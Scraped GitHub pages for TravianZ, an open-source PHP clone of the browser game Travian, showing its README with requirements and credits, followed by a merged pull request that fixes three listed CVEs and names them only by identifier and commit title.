* [Actions](/Shadowss/TravianZ/actions)
* [Projects](/Shadowss/TravianZ/projects)
* [Wiki](/Shadowss/TravianZ/wiki)
* [Security](/Shadowss/TravianZ/security)
* [Insights](/Shadowss/TravianZ/pulse)

# Shadowss/TravianZ

    master[Branches](/Shadowss/TravianZ/branches)[Tags](/Shadowss/TravianZ/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[2,917 Commits](/Shadowss/TravianZ/commits/master/) | | |
| [Admin](/Shadowss/TravianZ/tree/master/Admin "Admin") | | [Admin](/Shadowss/TravianZ/tree/master/Admin "Admin") |  |  |
| [GameEngine](/Shadowss/TravianZ/tree/master/GameEngine "GameEngine") | | [GameEngine](/Shadowss/TravianZ/tree/master/GameEngine "GameEngine") |  |  |
| [Security](/Shadowss/TravianZ/tree/master/Security "Security") | | [Security](/Shadowss/TravianZ/tree/master/Security "Security") |  |  |
| [Templates](/Shadowss/TravianZ/tree/master/Templates "Templates") | | [Templates](/Shadowss/TravianZ/tree/master/Templates "Templates") |  |  |
| [gpack](/Shadowss/TravianZ/tree/master/gpack "gpack") | | [gpack](/Shadowss/TravianZ/tree/master/gpack "gpack") |  |  |
| [img](/Shadowss/TravianZ/tree/master/img "img") | | [img](/Shadowss/TravianZ/tree/master/img "img") |  |  |
| [install](/Shadowss/TravianZ/tree/master/install "install") | | [install](/Shadowss/TravianZ/tree/master/install "install") |  |  |
| [notification](/Shadowss/TravianZ/tree/master/notification "notification") | | [notification](/Shadowss/TravianZ/tree/master/notification "notification") |  |  |
| [src](/Shadowss/TravianZ/tree/master/src "src") | | [src](/Shadowss/TravianZ/tree/master/src "src") |  |  |
| [tools](/Shadowss/TravianZ/tree/master/tools "tools") | | [tools](/Shadowss/TravianZ/tree/master/tools "tools") |  |  |
| [var](/Shadowss/TravianZ/tree/master/var "var") | | [var](/Shadowss/TravianZ/tree/master/var "var") |  |  |
| [.gitattributes](/Shadowss/TravianZ/blob/master/.gitattributes ".gitattributes") | | [.gitattributes](/Shadowss/TravianZ/blob/master/.gitattributes ".gitattributes") |  |  |
| [.gitignore](/Shadowss/TravianZ/blob/master/.gitignore ".gitignore") | | [.gitignore](/Shadowss/TravianZ/blob/master/.gitignore ".gitignore") |  |  |
| [.htaccess](/Shadowss/TravianZ/blob/master/.htaccess ".htaccess") | | [.htaccess](/Shadowss/TravianZ/blob/master/.htaccess ".htaccess") |  |  |
| [AC\_OETags.js](/Shadowss/TravianZ/blob/master/AC_OETags.js "AC_OETags.js") | | [AC\_OETags.js](/Shadowss/TravianZ/blob/master/AC_OETags.js "AC_OETags.js") |  |  |
| [CODE\_OF\_CONDUCT.md](/Shadowss/TravianZ/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") | | [CODE\_OF\_CONDUCT.md](/Shadowss/TravianZ/blob/master/CODE_OF_CONDUCT.md "CODE_OF_CONDUCT.md") |  |  |
| [CONTRIBUTING.md](/Shadowss/TravianZ/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") | | [CONTRIBUTING.md](/Shadowss/TravianZ/blob/master/CONTRIBUTING.md "CONTRIBUTING.md") |  |  |
| [ISSUE\_TEMPLATE.md](/Shadowss/TravianZ/blob/master/ISSUE_TEMPLATE.md "ISSUE_TEMPLATE.md") | | [ISSUE\_TEMPLATE.md](/Shadowss/TravianZ/blob/master/ISSUE_TEMPLATE.md "ISSUE_TEMPLATE.md") |  |  |
| [LICENSE](/Shadowss/TravianZ/blob/master/LICENSE "LICENSE") | | [LICENSE](/Shadowss/TravianZ/blob/master/LICENSE "LICENSE") |  |  |
| [README.md](/Shadowss/TravianZ/blob/master/README.md "README.md") | | [README.md](/Shadowss/TravianZ/blob/master/README.md "README.md") |  |  |
| [a2b.php](/Shadowss/TravianZ/blob/master/a2b.php "a2b.php") | | [a2b.php](/Shadowss/TravianZ/blob/master/a2b.php "a2b.php") |  |  |
| [a2b2.php](/Shadowss/TravianZ/blob/master/a2b2.php "a2b2.php") | | [a2b2.php](/Shadowss/TravianZ/blob/master/a2b2.php "a2b2.php") |  |  |
| [activate.php](/Shadowss/TravianZ/blob/master/activate.php "activate.php") | | [activate.php](/Shadowss/TravianZ/blob/master/activate.php "activate.php") |  |  |
| [agb.php](/Shadowss/TravianZ/blob/master/agb.php "agb.php") | | [agb.php](/Shadowss/TravianZ/blob/master/agb.php "agb.php") |  |  |
| [ajax.php](/Shadowss/TravianZ/blob/master/ajax.php "ajax.php") | | [ajax.php](/Shadowss/TravianZ/blob/master/ajax.php "ajax.php") |  |  |
| [allianz.php](/Shadowss/TravianZ/blob/master/allianz.php "allianz.php") | | [allianz.php](/Shadowss/TravianZ/blob/master/allianz.php "allianz.php") |  |  |
| [anleitung.php](/Shadowss/TravianZ/blob/master/anleitung.php "anleitung.php") | | [anleitung.php](/Shadowss/TravianZ/blob/master/anleitung.php "anleitung.php") |  |  |
| [anmelden.php](/Shadowss/TravianZ/blob/master/anmelden.php "anmelden.php") | | [anmelden.php](/Shadowss/TravianZ/blob/master/anmelden.php "anmelden.php") |  |  |
| [autoloader.php](/Shadowss/TravianZ/blob/master/autoloader.php "autoloader.php") | | [autoloader.php](/Shadowss/TravianZ/blob/master/autoloader.php "autoloader.php") |  |  |
| [banned.php](/Shadowss/TravianZ/blob/master/banned.php "banned.php") | | [banned.php](/Shadowss/TravianZ/blob/master/banned.php "banned.php") |  |  |
| [berichte.php](/Shadowss/TravianZ/blob/master/berichte.php "berichte.php") | | [berichte.php](/Shadowss/TravianZ/blob/master/berichte.php "berichte.php") |  |  |
| [build.php](/Shadowss/TravianZ/blob/master/build.php "build.php") | | [build.php](/Shadowss/TravianZ/blob/master/build.php "build.php") |  |  |
| [celebration.php](/Shadowss/TravianZ/blob/master/celebration.php "celebration.php") | | [celebration.php](/Shadowss/TravianZ/blob/master/celebration.php "celebration.php") |  |  |
| [crop\_finder.php](/Shadowss/TravianZ/blob/master/crop_finder.php "crop_finder.php") | | [crop\_finder.php](/Shadowss/TravianZ/blob/master/crop_finder.php "crop_finder.php") |  |  |
| [dorf1.php](/Shadowss/TravianZ/blob/master/dorf1.php "dorf1.php") | | [dorf1.php](/Shadowss/TravianZ/blob/master/dorf1.php "dorf1.php") |  |  |
| [dorf2.php](/Shadowss/TravianZ/blob/master/dorf2.php "dorf2.php") | | [dorf2.php](/Shadowss/TravianZ/blob/master/dorf2.php "dorf2.php") |  |  |
| [dorf3.php](/Shadowss/TravianZ/blob/master/dorf3.php "dorf3.php") | | [dorf3.php](/Shadowss/TravianZ/blob/master/dorf3.php "dorf3.php") |  |  |
| [favicon.ico](/Shadowss/TravianZ/blob/master/favicon.ico "favicon.ico") | | [favicon.ico](/Shadowss/TravianZ/blob/master/favicon.ico "favicon.ico") |  |  |
| [flaggen.js](/Shadowss/TravianZ/blob/master/flaggen.js "flaggen.js") | | [flaggen.js](/Shadowss/TravianZ/blob/master/flaggen.js "flaggen.js") |  |  |
| [impressum.php](/Shadowss/TravianZ/blob/master/impressum.php "impressum.php") | | [impressum.php](/Shadowss/TravianZ/blob/master/impressum.php "impressum.php") |  |  |
| [index.php](/Shadowss/TravianZ/blob/master/index.php "index.php") | | [index.php](/Shadowss/TravianZ/blob/master/index.php "index.php") |  |  |
| [karte.php](/Shadowss/TravianZ/blob/master/karte.php "karte.php") | | [karte.php](/Shadowss/TravianZ/blob/master/karte.php "karte.php") |  |  |
| [karte2.php](/Shadowss/TravianZ/blob/master/karte2.php "karte2.php") | | [karte2.php](/Shadowss/TravianZ/blob/master/karte2.php "karte2.php") |  |  |
| [login.php](/Shadowss/TravianZ/blob/master/login.php "login.php") | | [login.php](/Shadowss/TravianZ/blob/master/login.php "login.php") |  |  |
| [logout.php](/Shadowss/TravianZ/blob/master/logout.php "logout.php") | | [logout.php](/Shadowss/TravianZ/blob/master/logout.php "logout.php") |  |  |
| [mailme.php](/Shadowss/TravianZ/blob/master/mailme.php "mailme.php") | | [mailme.php](/Shadowss/TravianZ/blob/master/mailme.php "mailme.php") |  |  |
| [maintenance.php](/Shadowss/TravianZ/blob/master/maintenance.php "maintenance.php") | | [maintenance.php](/Shadowss/TravianZ/blob/master/maintenance.php "maintenance.php") |  |  |
| [manual.php](/Shadowss/TravianZ/blob/master/manual.php "manual.php") | | [manual.php](/Shadowss/TravianZ/blob/master/manual.php "manual.php") |  |  |
| [massmessage.php](/Shadowss/TravianZ/blob/master/massmessage.php "massmessage.php") | | [massmessage.php](/Shadowss/TravianZ/blob/master/massmessage.php "massmessage.php") |  |  |
| [mt-core.js](/Shadowss/TravianZ/blob/master/mt-core.js "mt-core.js") | | [mt-core.js](/Shadowss/TravianZ/blob/master/mt-core.js "mt-core.js") |  |  |
| [mt-full.js](/Shadowss/TravianZ/blob/master/mt-full.js "mt-full.js") | | [mt-full.js](/Shadowss/TravianZ/blob/master/mt-full.js "mt-full.js") |  |  |
| [mt-more.js](/Shadowss/TravianZ/blob/master/mt-more.js "mt-more.js") | | [mt-more.js](/Shadowss/TravianZ/blob/master/mt-more.js "mt-more.js") |  |  |
| [nachrichten.php](/Shadowss/TravianZ/blob/master/nachrichten.php "nachrichten.php") | | [nachrichten.php](/Shadowss/TravianZ/blob/master/nachrichten.php "nachrichten.php") |  |  |
| [new.js](/Shadowss/TravianZ/blob/master/new.js "new.js") | | [new.js](/Shadowss/TravianZ/blob/master/new.js "new.js") |  |  |
| [new2.js](/Shadowss/TravianZ/blob/master/new2.js "new2.js") | | [new2.js](/Shadowss/TravianZ/blob/master/new2.js "new2.js") |  |  |
| [packages.php](/Shadowss/TravianZ/blob/master/packages.php "packages.php") | | [packages.php](/Shadowss/TravianZ/blob/master/packages.php "packages.php") |  |  |
| [password.php](/Shadowss/TravianZ/blob/master/password.php "password.php") | | [password.php](/Shadowss/TravianZ/blob/master/password.php "password.php") |  |  |
| [plus.php](/Shadowss/TravianZ/blob/master/plus.php "plus.php") | | [plus.php](/Shadowss/TravianZ/blob/master/plus.php "plus.php") |  |  |
| [plus1.php](/Shadowss/TravianZ/blob/master/plus1.php "plus1.php") | | [plus1.php](/Shadowss/TravianZ/blob/master/plus1.php "plus1.php") |  |  |
| [rules.php](/Shadowss/TravianZ/blob/master/rules.php "rules.php") | | [rules.php](/Shadowss/TravianZ/blob/master/rules.php "rules.php") |  |  |
| [spieler.php](/Shadowss/TravianZ/blob/master/spieler.php "spieler.php") | | [spieler.php](/Shadowss/TravianZ/blob/master/spieler.php "spieler.php") |  |  |
| [spielregeln.php](/Shadowss/TravianZ/blob/master/spielregeln.php "spielregeln.php") | | [spielregeln.php](/Shadowss/TravianZ/blob/master/spielregeln.php "spielregeln.php") |  |  |
| [sql\_updates.txt](/Shadowss/TravianZ/blob/master/sql_updates.txt "sql_updates.txt") | | [sql\_updates.txt](/Shadowss/TravianZ/blob/master/sql_updates.txt "sql_updates.txt") |  |  |
| [statistiken.php](/Shadowss/TravianZ/blob/master/statistiken.php "statistiken.php") | | [statistiken.php](/Shadowss/TravianZ/blob/master/statistiken.php "statistiken.php") |  |  |
| [support.php](/Shadowss/TravianZ/blob/master/support.php "support.php") | | [support.php](/Shadowss/TravianZ/blob/master/support.php "support.php") |  |  |
| [sysmsg.php](/Shadowss/TravianZ/blob/master/sysmsg.php "sysmsg.php") | | [sysmsg.php](/Shadowss/TravianZ/blob/master/sysmsg.php "sysmsg.php") |  |  |
| [terms.php](/Shadowss/TravianZ/blob/master/terms.php "terms.php") | | [terms.php](/Shadowss/TravianZ/blob/master/terms.php "terms.php") |  |  |
| [todo.txt](/Shadowss/TravianZ/blob/master/todo.txt "todo.txt") | | [todo.txt](/Shadowss/TravianZ/blob/master/todo.txt "todo.txt") |  |  |
| [tutorial.php](/Shadowss/TravianZ/blob/master/tutorial.php "tutorial.php") | | [tutorial.php](/Shadowss/TravianZ/blob/master/tutorial.php "tutorial.php") |  |  |
| [uncrypt.js](/Shadowss/TravianZ/blob/master/uncrypt.js "uncrypt.js") | | [uncrypt.js](/Shadowss/TravianZ/blob/master/uncrypt.js "uncrypt.js") |  |  |
| [unx.js](/Shadowss/TravianZ/blob/master/unx.js "unx.js") | | [unx.js](/Shadowss/TravianZ/blob/master/unx.js "unx.js") |  |  |
| [version.php](/Shadowss/TravianZ/blob/master/version.php "version.php") | | [version.php](/Shadowss/TravianZ/blob/master/version.php "version.php") |  |  |
| [warsim.php](/Shadowss/TravianZ/blob/master/warsim.php "warsim.php") | | [warsim.php](/Shadowss/TravianZ/blob/master/warsim.php "warsim.php") |  |  |
| [winner.php](/Shadowss/TravianZ/blob/master/winner.php "winner.php") | | [winner.php](/Shadowss/TravianZ/blob/master/winner.php "winner.php") |  |  |
| View all files | | |

## Repository files navigation

* README
* Code of conduct
* GPL-3.0 license
# [Code Triagers Badge](https://www.codetriage.com/shadowss/travianz) [Maintenance](https://github.com/Shadowss/TravianZ) [GitHub Release](https://github.com/Shadowss/TravianZ) [Github All Releases](https://github.com/Shadowss/TravianZ) [GitHub contributors](https://github.com/Shadowss/TravianZ) [license](https://github.com/Shadowss/TravianZ) [GitHub last commit](https://github.com/Shadowss/TravianZ) [Proudly Coded in PHPStorm](https://www.jetbrains.com/buy/opensource/?product=phpstorm) [Donate to this project on LiberaPay](https://liberapay.com/Shadowss/donate) [Join the chat at https://gitter.im/TravianZ-V8/Lobby](https://gitter.im/TravianZ-V8/Lobby?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge) [Watch how this was made on YouTube](https://www.youtube.com/watch?v=1XiHhpGUmQg&list=PLzV5avt1FFHorlIeoL9YX0pdb9bj-FO84)

# [GitHub forks](https://github.com/Shadowss/TravianZ) [GitHub stars](https://github.com/Shadowss/TravianZ) [GitHub watchers](https://github.com/Shadowss/TravianZ) [GitHub followers](https://github.com/Shadowss/TravianZ) [Twitter URL](https://twitter.com/cata7007)

# TravianZ Version **v.8.3.5**

**Note:** this game is still in a pre-release state, although at this point it is very playable, tested and found to be fairly stable

**WARNING:** please note that ***this is in no way an upgrade*** from the old 8.3.2 version, so please ***do not try to just copy your files over***,
since the installer logic has changed and you would just crash your old version

**Quick links:**

* [Download and Updates](https://github.com/Shadowss/TravianZ) »» <https://github.com/Shadowss/TravianZ>
* [Wiki](https://github.com/Shadowss/TravianZ/wiki)
* [Game Mechanics](http://travian.wikia.com/wiki/Travian_Wiki)
* [The Making Of](https://www.youtube.com/watch?v=1XiHhpGUmQg&list=PLzV5avt1FFHorlIeoL9YX0pdb9bj-FO84) - YouTube Videos about this project
* [Donate to TravianZ](https://www.paypal.me/cata7007)

**Minimum requirements:**

* [PHP](http://php.net/) 7.0.0+
* [MySQL Community Server](https://dev.mysql.com/downloads/mysql/) 5.5+
  + or alternatively, [MariaDB](https://downloads.mariadb.org/) 5.5+
* Runs fine on Ubuntu 20, Apache2 2.4, MySQL Server 8.0 and PHP 7.4

**Dedicated or shared hosting?**

We *strongly* recommend using a ***dedicated hosting*** for this game. Big Travian servers used to host
thousands of players and the original servers still had about 300ms page display time. The legacy code
in this clone (which was created in 2013) is right now doing about **400 MySQL queries** (questions
to the database) per single page refresh - which is usually well beyond what most shared hostings can support
with a big enough player base.

**Support & Bug reports**

We are usually available to chat at our [Gitter channel](https://gitter.im/TravianZ-V8/Lobby), if you like to ask
any questions or just talk to the developers about how great their day is today :) As for bug reports, please use
the [Issues tab](https://github.com/Shadowss/TravianZ/issues) and create new issue, whether it's an error in game
or you have a feature request to be included in the play.

**The team**

* [Shadowss](https://github.com/Shadowss) - project owner and an occasional developer / tester
* [iopietro](https://github.com/iopietro) - alumni developer
* [AL-Kateb](https://github.com/AL-Kateb) - alumni developer
* [martinambrus](https://github.com/martinambrus) - alumni developer
* [Vladyslav](https://github.com/velhbxtyrj) - rigorous game tester
* [phaze1G](https://github.com/phaze1G) - game designer / css support

**Thanks**

Many thanks to all those who recently played around with the project and tested it both, locally and on their
own servers. This includes [ZZJHONS](https://github.com/ZZJHONS), [DracoMilesX](https://github.com/DracoMilesX),
[phaze1G](https://github.com/phaze1G) , [martinambrus](https://github.com/martinambrus) and many others who were too shy to let us know that they use and enjoy
running this game :)

Also, our thanks go to all both, the original and occasional developers, especially [yi12345](https://github.com/yi12345/),
[advocaite](https://github.com/advocaite/), [brainiacX](https://github.com/brainiacX/), [ronix](https://github.com/ronix/),
[MisterX](https://github.com/MisterX/), [Elio](https://github.com/eliopinho/) and many others who were part of this
project's history.

Last but not least, our thanks go to [JetBrains](https://www.jetbrains.com/) for lending us a one-year full-featured
[open-source PHPStorm](https://www.jetbrains.com/buy/opensource/?product=phpstorm) (and other products) license!
Thanks guys, you're awesome :)

## About

Travian T3.6 , BEST VERSION EVER

### Topics

[game](/topics/game "Topic: game")
[game-development](/topics/game-development "Topic: game-development")
[mmorpg](/topics/mmorpg "Topic: mmorpg")
[travian](/topics/travian "Topic: travian")
[mmorpg-server](/topics/mmorpg-server "Topic: mmorpg-server")
[travian-clone](/topics/travian-clone "Topic: travian-clone")

### Resources

[Readme](#readme-ov-file)
### License

[GPL-3.0 license](#GPL-3.0-1-ov-file)
### Code of conduct

[Code of conduct](#coc-ov-file)

[Activity](/Shadowss/TravianZ/activity)
### Stars

[**218**
stars](/Shadowss/TravianZ/stargazers)
### Watchers

[**33**
watching](/Shadowss/TravianZ/watchers)
### Forks

[**136**
forks](/Shadowss/TravianZ/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ&report=Shadowss+%28user%29)

## [Releases](/Shadowss/TravianZ/releases)

[5
tags](/Shadowss/TravianZ/tags)

## [Packages 0](/users/Shadowss/packages?repo_name=TravianZ)

No packages published

## [Contributors 59](/Shadowss/TravianZ/graphs/contributors)

[+ 45 contributors](/Shadowss/TravianZ/graphs/contributors)

## Languages

* [Smarty
  43.8%](/Shadowss/TravianZ/search?l=smarty)
* [PHP
  41.7%](/Shadowss/TravianZ/search?l=php)
* [CSS
  9.9%](/Shadowss/TravianZ/search?l=css)
* [JavaScript
  4.3%](/Shadowss/TravianZ/search?l=javascript)
* [HTML
  0.3%](/Shadowss/TravianZ/search?l=html)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_1a717ae5_20250115_112715.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ%2Fpull%2F43)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ%2Fpull%2F43)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fpull_requests_fragments%2Fpull_request_layout&source=header-repo&source_repo=Shadowss%2FTravianZ)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Shadowss](/Shadowss)
/
**[TravianZ](/Shadowss/TravianZ)**
Public

* [Notifications](/login?return_to=%2FShadowss%2FTravianZ) You must be signed in to change notification settings
* [Fork
  136](/login?return_to=%2FShadowss%2FTravianZ)
* [Star
   218](/login?return_to=%2FShadowss%2FTravianZ)

* [Code](/Shadowss/TravianZ)
* [Issues
  24](/Shadowss/TravianZ/issues)
* [Pull requests
  0](/Shadowss/TravianZ/pulls)
* [Discussions](/Shadowss/TravianZ/discussions)
* [Actions](/Shadowss/TravianZ/actions)
* [Projects
  2](/Shadowss/TravianZ/projects)
* [Wiki](/Shadowss/TravianZ/wiki)
* [Security](/Shadowss/TravianZ/security)
* [Insights](/Shadowss/TravianZ/pulse)

Additional navigation options

* [Code](/Shadowss/TravianZ)
* [Issues](/Shadowss/TravianZ/issues)
* [Pull requests](/Shadowss/TravianZ/pulls)
* [Discussions](/Shadowss/TravianZ/discussions)
* [Actions](/Shadowss/TravianZ/actions)
* [Projects](/Shadowss/TravianZ/projects)
* [Wiki](/Shadowss/TravianZ/wiki)
* [Security](/Shadowss/TravianZ/security)
* [Insights](/Shadowss/TravianZ/pulse)

New issue

**Have a question about this project?** Sign up for a free GitHub account to open an issue and contact its maintainers and the community.

 [Sign up for GitHub](/signup?return_to=%2FShadowss%2FTravianZ%2Fissues%2Fnew%2Fchoose)

By clicking “Sign up for GitHub”, you agree to our [terms of service](https://docs.github.com/terms) and
[privacy statement](https://docs.github.com/privacy). We’ll occasionally send you account related emails.

Already on GitHub?
[Sign in](/login?return_to=%2FShadowss%2FTravianZ%2Fissues%2Fnew%2Fchoose)
to your account

[Jump to bottom](#issue-comment-box)

# Fix CVE-2023-36993, CVE-2023-36994, CVE-2023-36995 #43

 Merged

[Shadowss](/Shadowss)
merged 5 commits into
[Shadowss:master](/Shadowss/TravianZ/tree/master "Shadowss/TravianZ:master")
from
[bram1000:master](/bram1000/TravianZ/tree/master "bram1000/TravianZ:master")

May 15, 2024

 Merged

# [Fix CVE-2023-36993, CVE-2023-36994, CVE-2023-36995](#top) #43

[Shadowss](/Shadowss)
merged 5 commits into
[Shadowss:master](/Shadowss/TravianZ/tree/master "Shadowss/TravianZ:master")
from
[bram1000:master](/bram1000/TravianZ/tree/master "bram1000/TravianZ:master")

May 15, 2024

[Conversation
0](/Shadowss/TravianZ/pull/43)
[Commits
5](/Shadowss/TravianZ/pull/43/commits)
[Checks
0](/Shadowss/TravianZ/pull/43/checks)
[Files changed](/Shadowss/TravianZ/pull/43/files)

## Conversation

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

[![bram1000](https://avatars.githubusercontent.com/u/33527907?s=60&v=4)](/bram1000)

Copy link

Contributor

### @bram1000 **[bram1000](/bram1000)** commented [Jul 6, 2023](#issue-1792239848)

Does not yet fix [CVE-2023-36992](https://github.com/advisories/GHSA-x9fg-g7mh-xpcp "CVE-2023-36992").

<https://bramdoessecurity.com/travianz-hacked/>

Sorry, something went wrong.

All reactions

 [bram1000](/bram1000)
and others
added 4 commits
[July 6, 2023 22:31](#commits-pushed-271aa93)

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)

`[Fix](/Shadowss/TravianZ/pull/43/commits/271aa93be2e31bf9d1850532ff6c5ac083694919 "Fix CVE-2023-36994") [CVE-2023-36994](https://github.com/advisories/GHSA-7wwj-hgj5-9v54 "CVE-2023-36994")`

`[271aa93](/Shadowss/TravianZ/pull/43/commits/271aa93be2e31bf9d1850532ff6c5ac083694919)`

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)

`[Fix](/Shadowss/TravianZ/pull/43/commits/78b2bddde4f574fc73fc4704958d0864750bf22e "Fix CVE-2023-36993") [CVE-2023-36993](https://github.com/advisories/GHSA-g4gr-f4c2-2wx2 "CVE-2023-36993")`

`[78b2bdd](/Shadowss/TravianZ/pull/43/commits/78b2bddde4f574fc73fc4704958d0864750bf22e)`

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)

`[Fix](/Shadowss/TravianZ/pull/43/commits/e39ca488a9fd2409dbc212d625b518cc9e1c9e67 "Fix CVE-2023-36995") [CVE-2023-36995](https://github.com/advisories/GHSA-2v2c-pqx4-qvqc "CVE-2023-36995")`

`[e39ca48](/Shadowss/TravianZ/pull/43/commits/e39ca488a9fd2409dbc212d625b518cc9e1c9e67)`

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)

`[Fix](/Shadowss/TravianZ/pull/43/commits/1549f830aa4246480e7bb7090c9d394b54bf280b "Fix CVE-2023-36995 name change alliance") [CVE-2023-36995](https://github.com/advisories/GHSA-2v2c-pqx4-qvqc "CVE-2023-36995") [name change alliance](/Shadowss/TravianZ/pull/43/commits/1549f830aa4246480e7bb7090c9d394b54bf280b "Fix CVE-2023-36995 name change alliance")`

`[1549f83](/Shadowss/TravianZ/pull/43/commits/1549f830aa4246480e7bb7090c9d394b54bf280b)`

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)
[bram1000](/bram1000)
closed this
[Jul 6, 2023](#event-9748124365)

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)
[bram1000](/bram1000)
reopened this
[Jul 6, 2023](#event-9748125048)

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=40&v=4)](/bram1000)

`[Whoops!](/Shadowss/TravianZ/pull/43/commits/de804b95671d5b7850abca4ff84294cdffcd724d "Whoops!")`

`[de804b9](/Shadowss/TravianZ/pull/43/commits/de804b95671d5b7850abca4ff84294cdffcd724d)`

[![@Shadowss](https://avatars.githubusercontent.com/u/1140613?s=40&v=4)](/Shadowss)
[Shadowss](/Shadowss)
merged commit [`2a75177`](/Shadowss/TravianZ/commit/2a75177377b1a94a7221e1ed63c0906808233a4f)
into
Shadowss:master

[May 15, 2024](https://github.com/Shadowss/TravianZ/pull/43#event-12814574364)

[Sign up for free](/join?source=comment-repo)
**to join this conversation on GitHub**.
Already have an account?
[Sign in to comment](/login?return_to=https%3A%2F%2Fgithub.com%2FShadowss%2FTravianZ%2Fpull%2F43)

Reviewers

No reviews

Assignees

No one assigned

Labels

None yet

Projects

None yet

Milestone

No milestone

Development

Successfully merging this pull request may close these issues.

2 participants

[![@bram1000](https://avatars.githubusercontent.com/u/33527907?s=52&v=4)](/bram1000) [![@Shadowss](https://avatars.githubusercontent.com/u/1140613?s=52&v=4)](/Shadowss)

Add this suggestion to a batch that can be applied as a single commit.
This suggestion is invalid because no changes were made to the code.
Suggestions cannot be applied while the pull request is closed.
Suggestions cannot be applied while viewing a subset of changes.
Only one suggestion per line can be applied in a batch.
Add this suggestion to a batch that can be applied as a single commit.
Applying suggestions on deleted lines is not supported.
You must change the existing code in this line in order to create a valid suggestion.
Outdated suggestions cannot be applied.
This suggestion has been applied or marked resolved.
Suggestions cannot be applied from pending reviews.
Suggestions cannot be applied on multi-line comments.
Suggestions cannot be applied while the pull request is queued to merge.
Suggestion cannot be applied right now. Please check back later.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


